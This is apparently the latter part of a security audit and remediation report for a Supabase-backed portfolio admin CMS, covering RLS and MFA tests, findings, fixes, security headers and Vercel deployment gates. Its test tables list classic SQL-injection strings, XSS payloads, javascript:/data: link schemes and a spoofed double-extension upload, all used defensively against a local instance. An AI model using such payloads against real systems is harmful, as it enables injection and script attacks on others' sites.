| CMS INSERT allowed | 201 | 201 | PASS |
| CMS UPDATE allowed | 200 / 1 row | 200 / 1 row | PASS |
| `profile_content` UPDATE allowed | 200 / 1 row | 200 / 1 row | PASS |
| `about_organization` UPDATE allowed | 200 / 1 row | 200 / 1 row | PASS |
| `hero_media` slot 1 UPDATE allowed | 200 / 1 row | 200 / 1 row | PASS |
| `app_private.admin_users` still unreachable | >=400 | 404 | PASS |
| Staging WebP upload allowed | 200 | 200 | PASS |
| Staging read allowed | 200 | 200 | PASS |
| `portfolio-media` upload allowed | 200 | 200 | PASS |
| Test media delete allowed | 200 | 200 | PASS |
| Non-`.webp` extension upload rejected | >=400 | 400 | PASS |
| `hero_media` INSERT blocked (no grant) | >=400 | 403 | PASS |
| `hero_media` DELETE blocked (no grant) | >=400 | 403 | PASS |
| `technologies` DELETE blocked (no grant) | >=400 | 403 | PASS (see L-3) |

### 5. MFA escalation (the decisive set)

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| Fresh owner has zero factors | 0 | 0 | PASS |
| `aal1` **can** self-enroll the **first** factor | — | 200 | **FINDING H-3** |
| First-factor verify yields `aal2` | aal2 | aal2 | **FINDING H-3** |
| Re-login with password only is `aal1` | aal1 | aal1 | PASS |
| `aal1` blocked from enrolling a **second** factor | >=400 | 403 `insufficient_aal` | PASS |
| `aal1` blocked from unenrolling existing factor | >=400 | 422 | PASS |
| `aal1` blocked from changing password | >=400 | 401 | PASS |
| `aal1` cannot read drafts | 0 rows | 0 rows | PASS |
| Public signup disabled | >=400 | 422 | PASS |
| Second admin row rejected (singleton) | rejected | rejected | PASS |

### 6. Database constraints

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| **Hero slot 4 rejected by database** | >=400 | 403 | PASS |
| Hero UPDATE moving row to slot 4 rejected | >=400 | 403 | PASS |
| **Duplicate project slug rejected** | >=400 | 409 | PASS |
| **Invalid project status rejected** | >=400 | 400 | PASS |
| Malformed project slug rejected (regex) | >=400 | 400 | PASS |
| **Technology duplicate name differing only by case rejected** | >=400 | 409 | PASS |
| Invalid experience status rejected | >=400 | 400 | PASS |
| Public-stack technology without `public_group` rejected | >=400 | 400 | PASS |
| **Published child rows cannot expose Draft parent** | canary absent | hidden | PASS |

### 7. Attack-shaped input (harmless payloads, local only)

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| `' OR '1'='1` stored inert | byte-identical | identical | PASS |
| `'; DROP TABLE projects; --` stored inert | byte-identical | identical | PASS |
| `projects` table intact after DROP payload | intact | intact | PASS |
| `<script>alert(1)</script>` stored inert | byte-identical | identical | PASS |
| `<img src=x onerror=alert(1)>` stored inert | byte-identical | identical | PASS |
| `javascript:alert(1)` stored inert as text | byte-identical | identical | PASS |
| Anon filter `status=eq.draft` cannot bypass RLS | 0 rows | 0 rows | PASS |
| Anon `or()` filter cannot bypass RLS | 0 rows | 0 rows | PASS |
| Anon resource embedding cannot reach Draft children | canary absent | hidden | PASS |
| **`demo_url` rejects `javascript:` scheme** | rejected | **201 accepted** | **FAIL — M-3** |
| **`github_url` rejects `data:text/html`** | rejected | **201 accepted** | **FAIL — M-3** |
| **Link columns reject `vbscript:`** | rejected | **201 accepted** | **FAIL — M-3** |
| **Link columns reject whitespace-prefixed `javascript:`** | rejected | **201 accepted** | **FAIL — M-3** |
| Storage `../` traversal out of staging | blocked | 400, no object created | PASS |
| `evil.html.webp` double extension | rejected | **200 accepted** | **FAIL — M-5** |
| HTML bytes under `image/webp` content-type | rejected | **200 accepted** | **FAIL — M-5** |
| Spoofed object served as `image/webp` not `text/html` | image/webp | image/webp | PASS (mitigating) |

### 8. Privilege baseline

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| New `public` table default grants to `anon` | none | **DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE** | **FAIL — H-1** |
| New `public` table RLS default | enabled | **disabled** | **FAIL — H-1** |
| RLS blocks anon INSERT (replica table) | blocked | blocked | PASS |
| RLS blocks anon DELETE (replica table) | blocked | 0 rows | PASS |
| **RLS blocks anon TRUNCATE** (replica table) | blocked | **TRUNCATE SUCCEEDED** | **FAIL — M-2** |
| All 13 CMS tables have RLS enabled | 13/13 | 13/13 | PASS |
| CMS tables grant `anon` SELECT only | SELECT only | SELECT only | PASS |

### Cleanup verification

Every test artifact was removed and absence was verified, not assumed:

```
residual projects:            []
residual technologies:        []
residual experiences:         []
residual staging objects:     []
residual media objects:       []
residual local auth users:    0
app_private.admin_users:      emptied
hero_media:                   3 rows, all paths reset to NULL
profile_content:              name reset to NULL
```

`supabase/config.toml` was temporarily toggled twice to permit login testing (M-1 blocks sign-in entirely), then restored. Integrity confirmed by blob hash:

```
committed: 3607db4a22a8c1c61387453d53ebaee956b2fb47
restored:  3607db4a22a8c1c61387453d53ebaee956b2fb47   -> identical
git status: only the pre-existing ' M admin/admin.js' from before the audit
```

---

# Manual Tests Still Required

These cannot be safely or meaningfully automated from this repository.

| ID | Test | Why manual | Priority |
|----|------|-----------|----------|
| **MT-1** | Verify **production** Auth settings in the Supabase Dashboard: signup disabled, anonymous sign-ins disabled, password length/complexity, session timebox, captcha, email confirmations | Production Auth config is dashboard-managed and not represented in the repo. `config.toml` governs local only. | **HIGH** |
| **MT-2** | Confirm exactly **one** row exists in production `app_private.admin_users` and it matches the intended owner UUID | Requires production DB read; migration deliberately leaves it empty | **HIGH** |
| **MT-3** | Verify production bucket settings: `portfolio-staging` private, `portfolio-media` public, both `image/webp` only with a size cap | Buckets are dashboard-created per the migration header; local `config.toml` values do not apply | **HIGH** |
| **MT-4** | Confirm production owner has TOTP **enrolled and verified**, and that recovery codes are stored offline | Cannot create/modify production Auth users (safety rule 4). Directly closes H-3. | **HIGH** |
| **MT-5** | End-to-end browser test of the real login → MFA → admin flow, including refresh mid-session and back-button behaviour after logout | Requires a real browser and a real TOTP device | **HIGH** |
| **MT-6** | Confirm the production database does **not** carry the permissive `ALTER DEFAULT PRIVILEGES` state (H-1) | Requires production `information_schema` read | **HIGH** |
| **MT-7** | Verify the Guestbook still functions end-to-end **before and after** any M-2 grant change | Protected subsystem; must not regress | **MEDIUM** |
| **MT-8** | Confirm production `anon`/`authenticated` privileges on `comments` and `guestbook_rate_limits` (M-2) | Requires production read | **MEDIUM** |
| **MT-9** | Verify HTTPS enforcement, HSTS, and security headers on the deployed admin URL | Depends on hosting layer, not in repo | **MEDIUM** |
| **MT-10** | Confirm `submit-comment` Edge Function env secrets (`RATE_LIMIT_PEPPER`, service-role key) are set server-side only | Cannot read production function secrets — and must not | **MEDIUM** |
| **MT-11** | Re-audit XSS once CMS rendering is implemented | Code does not exist yet | **MEDIUM** (blocking before launch) |
| **MT-12** | Re-audit upload security once the image pipeline is implemented | Code does not exist yet | **MEDIUM** (blocking before launch) |

---

# Recommended Fix Order

**Phase 1 — Before any further CMS development**

1. **M-1** — Fix `[auth.email] enable_signup`. Nothing else can be tested end-to-end until login works. One line.
2. **H-3 / MT-4** — Enroll owner TOTP immediately and store recovery codes offline. Closes the highest live-risk window. No code change.
3. **MT-2** — Confirm exactly one owner row in production `app_private.admin_users`.

**Phase 2 — Structural hardening**

4. **H-1** — New migration reversing `ALTER DEFAULT PRIVILEGES` for `anon`/`authenticated`. Highest long-term value: it prevents an entire class of future mistakes. Do **not** edit the applied baseline.
5. **H-2** — Vendor or pin+SRI `supabase-js`; add doctype, charset, and a strict CSP to `admin/index.html`.
6. **MT-1 / MT-3 / MT-6** — Reconcile production dashboard settings with intent.

**Phase 3 — Before wiring the public site to CMS data**

7. **M-3** — Add URL-scheme `CHECK` constraints, and validate with `new URL()` at render time. Must land *before* any renderer touches `demo_url`/`github_url`.
8. **M-6** — Strengthen password policy and enable session timebox/inactivity.
9. **M-4** — Add `.env` to root `.gitignore`.

**Phase 4 — Upload pipeline**

10. **M-5** — Magic-byte validation, server-generated storage paths, reject double extensions.
11. Implement the specified image processor (decode → validate → re-encode WebP → upload optimized only → preserve old image on failure).

**Phase 5 — Cleanup**

12. **M-2** — Revoke `TRUNCATE`/DML from `anon` on the Guestbook tables (new migration; verify Guestbook first).
13. **L-1** through **L-7** — Low-severity items as convenient.

---

# Production Deployment Verdict

## NOT READY FOR PRODUCTION

**Development on `feature/admin-cms-v2` can and should continue** — the foundation is solid and worth building on.

**Why not production-ready:**

1. **The Admin CMS cannot currently be logged into.** M-1 disables email logins entirely. This alone is disqualifying.
2. **H-1** leaves a database baseline where every future `public` table is created anon-writable with RLS off — an unacceptable standing risk for an actively developed schema.
3. **H-2** places an unpinned, unverified third-party script on the page that handles the admin password and TOTP code.
4. **H-3** is live until TOTP is enrolled: today, a password alone is full CMS authority.
5. **The CMS does not exist yet.** No data layer, no rendering, no upload pipeline. There is no admin functionality to deploy.
6. Production Auth, bucket, and owner-row configuration are **unverified** (MT-1 through MT-4, MT-6).

**What is genuinely strong, and should not be lost in the noise:**

The authorization core is the hardest part of this system to get right, and it is right. `aal2` is enforced by PostgreSQL, not by JavaScript — proven by the owner at `aal1` being denied every single write at the API layer. Draft content did not leak through a single one of the ten paths I attacked it from, including PostgREST filter manipulation and resource embedding. `app_private` is invisible even to the fully authenticated owner. MFA cannot be self-escalated, stripped, or bypassed once enrolled. No secret has ever entered the repository, across its entire history. The single-owner constraint is structural, not conventional.

This is a materially better security posture than most personal projects ever reach. The findings above are about hardening an already-correct model and finishing the build — not about repairing a broken one.

**Re-audit required before production**, specifically covering: CMS data layer and rendering (XSS), the image upload pipeline, and confirmation of all Phase 1 and Phase 2 fixes.

---

# Remediation Verification

**Remediation date:** 2026-08-16
**Branch:** `feature/admin-cms-v2` (nothing committed, pushed, or deployed)
**Scope:** H-1, H-2, H-3, M-1 only. All other findings below remain as originally reported.

> The original findings above are retained verbatim and were **not** edited. This section records what changed and what was proven, and revises status only where evidence supports it.

## Status matrix

| Finding | Previous | Fix | Verification | Final Status |
|---|---|---|---|---|
| **H-1** — Inherited `ALTER DEFAULT PRIVILEGES` makes every future `public` table anon-writable with RLS off | Any new table in `public` born with `anon = arwdDxtm` (incl. **TRUNCATE**) and RLS **disabled** | **New** migration `20260815234351_harden_public_default_privileges.sql`. Revokes default privileges on future **tables**, **sequences** and **routines** from `anon` and `authenticated` for role `postgres` in schema `public`. No applied migration edited; `service_role` deliberately untouched | `supabase db reset` (local) → all 6 migrations applied. Disposable probe table created as `postgres`: grants to anon/authenticated = **`<none>`**. `has_table_privilege('anon', …)` = **f** for INSERT/UPDATE/DELETE/TRUNCATE. Live `SET ROLE anon` attempts: INSERT/UPDATE/DELETE/**TRUNCATE**/SELECT all **denied**, probe rows intact (3→3). New sequence: anon USAGE = **f**. Existing 15 tables still RLS-enabled; CMS tables still anon-`SELECT`-only; Guestbook insert, public read and identity sequence all still work. **26/26 passed** | **FIXED** |
| **H-2** — Admin auth page on floating CDN, no SRI, no CSP | `<script src=".../@supabase/supabase-js@2">`, no doctype, no `<head>`, no CSP, quirks mode | Pinned to exact **2.112.3** (verified as the same build the CDN's `@2` resolved to: `x-jsd-version: 2.112.3`), installed with `--save-exact` and **vendored same-origin** to `admin/vendor/supabase-js-2.112.3.js` — CDN removed entirely. Added `<!doctype html>`, `<html lang>`, `<head>`, `<meta charset>`, viewport, and a restrictive CSP | Loaded over a local static server in Chrome: `document.compatMode` = **`CSS1Compat`** (standards mode), doctype = `html`, scripts = **only** `./vendor/supabase-js-2.112.3.js` + `./admin.js`, **jsDelivr refs = 0**. `window.supabase.createClient` = `function`. Module chain executed under CSP: page transitioned loading → **login screen**, `admin-screen` **hidden**. Console after full reload: **zero errors, zero CSP violations**. CSP proven *enforced*: injected inline script **blocked** (`script-src-elem:inline`, did not execute) and cross-origin image **blocked** (`img-src`). Bundle contains **0** `eval(` / `new Function(` → no `unsafe-eval`, and no `unsafe-inline` | **FIXED** |
| **H-3** — MFA bootstrap window: password alone reaches `aal2` before first factor enrolled | Pre-enrollment, password alone = full CMS authority | **No code change** — MFA deliberately not weakened or redesigned. Supabase offers no supported way to remove first-factor self-enrollment without breaking bootstrap. Controls re-verified and the residual reduced to an operational step | Confirmed in the pinned bundle's own logic: `currentLevel` comes from the **server-issued JWT `aal` claim**; `nextLevel` is forced to `aal2` when any factor has `status === 'verified'` — so an `aal1` session with a verified factor routes to the **MFA challenge screen**, never the admin screen. Live: verified TOTP factor present (1); `nextLevel` = **aal2**; re-login `currentLevel` = **aal1**; `aal2` token `amr` = `["password","totp"]` (TOTP genuinely used). `aal1` **cannot** enrol another factor (**403 `insufficient_aal`**), **cannot** unenrol (**422**), **cannot** write CMS (**403**), **cannot** read Draft, **cannot** upload to Storage (**400**). `aal2` can do all four | **OPERATIONALLY MITIGATED** — see note below |
| **M-1** — `[auth.email] enable_signup = false` disabled email logins entirely | `signInWithPassword` returned `email_provider_disabled`; admin login impossible; lockout risk if pushed | One-line change: `[auth.email] enable_signup = true` (also removed a trailing space) + explanatory comment. Global `[auth] enable_signup = false` retained as the actual signup switch | Container env now `GOTRUE_EXTERNAL_EMAIL_ENABLED=true`, `GOTRUE_DISABLE_SIGNUP=true`, `GOTRUE_EXTERNAL_ANONYMOUS_USERS_ENABLED=false`. Live: existing admin password login **succeeds** (session issued at `aal1`); new signup **denied** (`422 signup_disabled`); anonymous sign-in **denied** (`422 anonymous_provider_disabled`); wrong password **rejected**. **6/6 passed** | **FIXED** |

### Note on H-3 classification

The brief allows classifying H-3 as CLOSED / OPERATIONALLY MITIGATED "if the verified owner factor already exists and the aal1/aal2 controls remain intact". Both halves were tested, and they resolve differently:

- **The `aal1`/`aal2` controls are intact** — proven above, server-side, at the API layer. This half is CLOSED.
- **Whether the *production* owner has a verified factor cannot be verified from here.** Reading or creating production Auth users is prohibited by the safety rules, and `app_private.admin_users` is empty in the local database by design.

H-3 is therefore recorded as **OPERATIONALLY MITIGATED**, with the residual tracked as **MT-4 (MANUAL TEST REQUIRED)**: confirm the production owner has TOTP enrolled and verified, and that recovery codes are stored offline. Until that is confirmed, the bootstrap window may still be open **in production** even though every control around it is verified correct.

## Remaining findings after remediation

| | Count | Detail |
|---|---|---|
| **Critical:** | **0** | Unchanged — none found. |
| **High:** | **0 open** | H-1 **FIXED**, H-2 **FIXED**, H-3 **OPERATIONALLY MITIGATED** (residual is manual step MT-4). |
| **Medium:** | **5 open** | M-1 **FIXED**. Still open and out of scope for this task: **M-2** (anon holds RLS-bypassing `TRUNCATE` on the Guestbook tables — re-confirmed unchanged, because `ALTER DEFAULT PRIVILEGES` affects only *future* objects by design), **M-3** (no URL-scheme validation on `demo_url`/`github_url`), **M-4** (root `.gitignore` lacks `.env`), **M-5** (Storage validates extension only), **M-6** (weak password policy, no session timebox). |
| **Low:** | **8 open** | L-1…L-7 unchanged, except **L-6 partially addressed** (quirks mode fixed by the new doctype; `admin/admin.css` is still empty and unlinked, so screen gating still relies on the UA default for `[hidden]`). Plus new **L-8** below. |

**New finding introduced by the H-2 fix — L-8 (Low):** `frame-ancestors` is ignored by browsers when a CSP is delivered via `<meta http-equiv>`, so the admin page currently has **no clickjacking protection**. It was deliberately omitted from the meta tag to avoid a permanent console warning. Clickjacking protection must be added at the hosting layer as a real HTTP response header (`Content-Security-Policy: frame-ancestors 'none'` or `X-Frame-Options: DENY`). Tracked under **MT-9**.

**Documented residual inside the H-1 fix:** PostgreSQL grants `EXECUTE` on new functions to `PUBLIC` by its own built-in default, which this migration deliberately does **not** revoke (doing so can break extension functions). Verified: a new probe function had **no explicit `anon=` ACL entry**, but remained executable via the `PUBLIC` grant. Future functions in `public` that must not be reachable through PostgREST `/rpc/` therefore still require an explicit `revoke execute on function … from public;`. This is stated in the migration file itself.

## Post-remediation verdict

## SAFE TO CONTINUE DEVELOPMENT

Both High findings that were fixable in code are **FIXED and independently verified**, and the third is mitigated with its residual reduced to a single documented manual step. The blocking defect that made the Admin CMS impossible to log into (M-1) is resolved.

This is **not** a change to the production verdict. The original **NOT READY FOR PRODUCTION** assessment still stands, because the reasons for it are largely unchanged: the CMS data layer, content rendering, and image upload pipeline **still do not exist**, five Medium findings remain open, and production Auth/bucket/owner configuration is still unverified (MT-1 through MT-4, MT-6). Re-audit before production remains required.

---

## Appendix A — Commands Executed

**Read-only inspection**
```
git branch --show-current
git status --porcelain
git ls-files
git log --all -p -- . ':(exclude)package-lock.json'    # full-history secret scan
git status --porcelain --ignored
git hash-object supabase/config.toml
find . -name ".env*" -not -path "./node_modules/*"
npm audit --json
npm outdated
npm ls --depth=0
docker info --format '{{.ServerVersion}}'
docker ps --format '{{.Names}}'
docker exec supabase_auth_... env                       # GoTrue config verification
npx supabase --version
npx supabase status
npx supabase migration list                             # read-only remote comparison
```

**Local database (LOCAL ONLY — never `db push`)**
```
npx supabase db reset          # local only; rebuilt from migrations
npx supabase stop --no-backup  # local only
npx supabase start             # local only
docker exec supabase_db_... psql -U postgres -d postgres -c "<read-only inspection>"
docker exec supabase_db_... psql ... # throwaway probe tables, created and dropped
```

**Test harnesses** (`scratchpad/audit.mjs`, `audit2.mjs`, `audit3.mjs` — outside the repository)
- 98 tests against `http://127.0.0.1:54321` only, with a hard guard aborting if `API_URL` is not `127.0.0.1`
- Raw `fetch` against local REST, Auth, and Storage APIs
- TOTP codes generated locally via Node `crypto` HMAC-SHA1
- Full cleanup with post-cleanup residual verification

## Appendix B — Files Inspected

| File | Focus |
|---|---|
| `admin/index.html` | Auth UI gating, CDN script, document structure, CSP |
| `admin/admin.js` | Session routing, AAL logic, MFA enrollment/challenge, DOM sinks |
| `admin/js/core/auth.js` | `signInWithPassword`, `getUser`, MFA API, `isOwner` |
| `admin/js/core/config.js` | Frontend constants — publishable vs. secret classification |
| `admin/js/core/supabase.js` | Client options: persistence, refresh, URL detection |
| `admin/admin.css` | Empty (0 bytes) — screen-gating fragility |
| `supabase/config.toml` | Auth, MFA, API schemas, Storage buckets, rate limits |
| `supabase/migrations/20260815212736_remote_schema.sql` | Baseline — **root cause of H-1 and M-2** |
| `supabase/migrations/20260815213435_admin_cms_schema.sql` | 13 tables, constraints, indexes, triggers |
| `supabase/migrations/20260815213442_admin_cms_rls.sql` | Helper functions, grants, 32 RLS policies |
| `supabase/migrations/20260815213447_admin_cms_storage_policies.sql` | Storage RLS, `.webp` enforcement |
| `supabase/migrations/20260815213451_admin_cms_seed.sql` | Singleton seed, owner-registration instructions |
| `supabase/functions/submit-comment/index.ts` | Read-only review — service-role handling, CORS, moderation |
| `supabase/.gitignore`, `.gitignore` | Secret-leak prevention |
| `js/guestbook.js` | XSS sinks, Supabase REST usage, key classification |
| `js/script.js`, `js/certificates.js`, `js/experience-stack.js`, `js/hero-photo-stack.js` | `innerHTML` / `href` / `setAttribute` sinks |
| `scripts/optimize-mobile-images.{js,py}` | Confirmed no Supabase or secret usage |
| `package.json`, `package-lock.json` | Dependency surface |
| `docs/Security/ADMIN-CMS-SECURITY.md`, `docs/Features/005-*.md`, `docs/Database/*.md` | Credential-leak scan; stated intent |

---

# Final Security Hardening — Pre-Production

Performed after the Admin CMS and all public CMS integrations (Hero, About,
Organization, Technologies, Experience, Project cards, Project detail) were
functionally complete. One new migration was added; no applied migration was
edited.

**Migration:** `20260818020000_security_hardening_pre_production.sql`

## Findings closed

| Finding | Before | After | Verification |
|---|---|---|---|
| **Technologies public SELECT too broad** (carried since the Technologies CMS phase) | Policy allowed `is_active = true OR referenced by published project`, so any active technology was anonymously readable even when deliberately kept out of the public Tech Stack | Policy now allows `(is_active AND show_in_public_stack AND public_group IS NOT NULL) OR (referenced by a published, non-deleted project)` | 5-case anon matrix: public-stack row **visible**; active-but-not-public **hidden**; no-group **hidden**; disabled + stack-hidden **but referenced by a published project** **visible**; referenced only by a draft project **hidden**. Live browser: Tech Stack renders only the public row while project cards and project detail still render the disabled, stack-hidden technology | **FIXED** |
| **`projects.github_url` / `demo_url` had no DB-level protocol validation** | JS was the only guard, in both Admin and the public renderer | `CHECK` constraints accept `NULL`, `''`, or `^https?://[^[:space:]]+$` | `javascript:`, `data:`, `vbscript:`, `file:`, `//evil.com` and mixed-case `jAvAsCrIpT:` all rejected with `projects_github_url_check`; valid `https://`, `http://` and `''` accepted. Constraints are **validating** (not `NOT VALID`), so a future push fails loudly rather than rewriting owner content | **FIXED** |
| **M-2 — Guestbook table privileges** | `comments` and `guestbook_rate_limits` both granted `anon` and `authenticated` **INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER`**. RLS does not restrain `TRUNCATE`; `guestbook_rate_limits` had RLS on with **zero policies**, so it was unreadable yet still truncatable | `comments` → `SELECT` only for both browser roles. `guestbook_rate_limits` → **no** grants to browser roles. `guestbook_rate_limits_id_seq` → `anon`/`authenticated` revoked | Anon `POST`/`PATCH`/`DELETE` on both tables → **401**. `service_role` (the `submit-comment` identity) retains full privileges and successfully inserted into both `comments` and `guestbook_rate_limits` after the change. Public read of approved comments unchanged | **FIXED** |

## Findings re-verified as already correct

- **Default privileges (H-1):** `ALTER DEFAULT PRIVILEGES` for role `postgres` in
  schema `public` grants future tables/sequences/routines to `postgres` and
  `service_role` only. No new migration needed.
- **Owner / AAL2 model:** `app_private.is_owner_admin()` and
  `is_owner_admin_aal2()` are `SECURITY DEFINER` with `search_path = ""`;
  `EXECUTE` is granted to `authenticated` but **not** `anon`;
  `app_private.admin_users` is `postgres`-only and holds exactly one row. All
  **14** non-`SELECT` policies in `public` are AAL2-gated and **zero**
  write policies reference `anon`.
- **Storage:** `portfolio-media` public, `portfolio-staging` private, both
  `image/webp` only with a 5 MB cap. Anon write/delete on both buckets and anon
  read of staging are denied; anon `LIST` returns `[]` for both (RLS filters
  every row); anon read of a real public object succeeds. All four object
  policies are AAL2-gated.
- **CSP (`admin/index.html`):** `default-src 'none'`, no `*`, no
  `unsafe-inline`, no `unsafe-eval`, `base-uri 'none'`, `form-action 'none'`,
  `object-src 'none'`; `connect-src`/`img-src` scoped to self, local dev
  origins and the production Supabase origin.
- **Safe DOM:** the five remaining `innerHTML` assignments (`js/guestbook.js`
  ×4, `js/script.js` ×1) are static template literals or `""`; untrusted
  guestbook fields use `createElement` + `textContent`. The public CMS
  renderers contain no `innerHTML` path at all.
- **Secrets:** no service-role key, secret key, JWT, TOTP seed or private key in
  the working tree or Git history. `submit-comment` reads its key from
  `Deno.env`. The one `sb_secret_` string in `admin/vendor/supabase-js-2.112.3.js`
  is the library's own key-prefix detector, not a credential.
- **Dependencies:** `npm audit` → **0** vulnerabilities across all severities;
  nothing outdated; `@supabase/supabase-js` remains pinned at `2.112.3`.

## MFA bootstrap (H-3) — current status

**MITIGATED.** Local state: one Auth user, one owner row, **one verified TOTP
factor**. With a verified factor present the bootstrap window is closed —
`nextLevel` resolves to `aal2`, so a password-only session routes to the MFA
challenge and never reaches the admin. The residual is unchanged and remains
**MT-4**: confirm the *production* owner has TOTP enrolled and verified with
recovery codes stored offline.

## Security headers — deployment requirement (closes MT-9 / L-8)

A CSP delivered by `<meta http-equiv>` cannot express `frame-ancestors`, so the
admin page currently has **no clickjacking protection**. These must be set as
real HTTP response headers by the host. They are configuration, not code, and
are deliberately not simulated in the app.

Apply to **all** responses:

```
Content-Security-Policy: frame-ancestors 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
```

Apply to **HTTPS production only**:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

For `/admin` specifically, also send the full CSP as a response header
(mirroring the meta tag) so it is enforced before parsing, and keep
`X-Robots-Tag: noindex, nofollow` alongside the existing meta robots tag.

Netlify (`_headers`), Vercel (`vercel.json` → `headers`), Cloudflare Pages
(`_headers`) and Nginx (`add_header`) all support this directly; the exact file
depends on the host, which is not yet chosen.

---

# Vercel Deployment Preparation (Phase 10A)

Hosting decision is locked: **Vercel Hobby**, private GitHub repository,
Supabase remains the backend. This section records only the Vercel-specific
requirements; the header rationale is in the section above.

## Repository artifacts

| File | Purpose |
|---|---|
| `vercel.json` | Security headers per route, cache policy, `cleanUrls: false` |
| `.vercelignore` | Keeps `docs/`, `supabase/`, `scripts/`, `node_modules/` and repo notes **off the public site** |

`.vercelignore` is a security control, not tidiness. Vercel serves the
repository root verbatim; without it the live site would publish this audit,
the full database schema, every RLS policy and `supabase/config.toml` at
predictable URLs.

`cleanUrls` is deliberately **false**. Enabling it would rewrite
`/project.html` to `/project`, breaking every CMS-generated card link
(`project.html?slug=…`). No rewrites are configured at all — the site is real
HTML files and must be served as such.

## Header decisions worth knowing

- **`frame-ancestors 'none'` is now a real response header** for every route,
  with `X-Frame-Options: DENY` as the legacy companion. This closes L-8 /
  MT-9, which a `<meta>` CSP could never express.
- **`style-src` includes `'unsafe-inline'`.** This was measured, not assumed:
  serving the strict policy locally produced 25 violations from the site's own
  slider, carousel and certificate code writing `element.style.*`. Splitting
  into `style-src-elem` / `style-src-attr` was tried and rejected — Chrome
  classifies those writes as element-level, so the split blocked them while
  adding no protection. Residual risk is low: every CMS renderer builds DOM
  with `createElement` + `textContent` and there is no `innerHTML` path for
  database content.
- **`script-src` has no `'unsafe-inline'` or `'unsafe-eval'` anywhere**, and
  no directive uses `*`.
- **`connect-src` is scoped** to `'self'`, the production Supabase origin and
  `https://api.iconify.design` (the icon font component fetches icon data at
  runtime). The Iconify fallback hosts `api.simplesvg.com` / `api.unisvg.com`
  are deliberately excluded; if the primary is unavailable a handful of icons
  simply do not render.
- **`/admin` gets a stricter, separate CSP** (`default-src 'none'`, plus
  `blob:` which the image processor needs) rather than weakening the public
  policy to cover both. It also carries `Cache-Control: no-store` and
  `X-Robots-Tag: noindex, nofollow, noarchive`.
- **HSTS is `max-age=31536000` with no `includeSubDomains` and no `preload`.**
  On a `*.vercel.app` hostname a subdomain-wide or preload commitment would be
  claiming ground the project does not own. Revisit only after a custom apex
  domain is in place and every subdomain is HTTPS.
- **HTML, CSS and JS are `max-age=0, must-revalidate`** so nobody is stranded
  on a stale `index.html`, `project.html` or CMS module. Only `/assets/*` gets
  a longer TTL (1 day, still revalidated).

## ⚠️ Preview deployments write to production Supabase

There is no separate Preview database. Environment resolution is by hostname:
anything that is not localhost resolves to the **production** Supabase project,
which includes every `*.vercel.app` Preview URL.

**Admin actions performed on a Vercel Preview mutate production data.** That is
intentional — the Preview is how production CMS content will be populated
before launch — but it must be understood before the first Preview login.

Consequence: **enable Vercel Authentication (Deployment Protection) for Preview
deployments before signing into Preview `/admin`.** An unprotected Preview URL
is a public admin login pointed at the production database.

Production itself is meant to be publicly reachable and must **not** be
protected.

## Deployment gates

**Gate 1 — database.** `supabase db push` applies the two pending migrations
(`20260815234351_harden_public_default_privileges`,
`20260818020000_security_hardening_pre_production`). Production is currently
missing both.

**Gate 2 — content.** Production CMS is empty today: 0 published Experiences,
0 published Projects, 0 public Technologies, Profile/About unconfigured, 3 Hero
slots with no images. Deploying against that state renders a **degraded** site:
Hero/About fall back to static V1 copy, the Tech Stack shows three empty group
headings, and the Experience and Portfolio sections hide themselves along with
their navigation links. Do **not** promote to Production until the CMS holds:

- intended Profile / Hero / About content
- exactly 3 intended Hero media slots
- intended Technologies across the three public groups
- intended Published Experiences
- intended Published Projects, with project media verified

**Gate 3 — Auth URLs.** Once the final production hostname is known, set the
Supabase Auth **Site URL** and redirect allow-list to match it.

**Gate 4 — smoke test.** Public: Hero/About, Tech Stack, Experience, Projects,
Project Detail, Guestbook read + submit. Admin: login → MFA → dashboard → one
edit per module → storage upload → logout. Security: anonymous writes denied,
Draft content not exposed, `portfolio-staging` unreachable.

## Rollback

Vercel keeps every previous deployment; rolling the site back is an instant
promote of the prior deployment and needs no repository change. Database
rollback is separate and is covered by the forward-fix strategy recorded in the
hardening section above — a bad policy is corrected by a new migration, never
by editing an applied one.
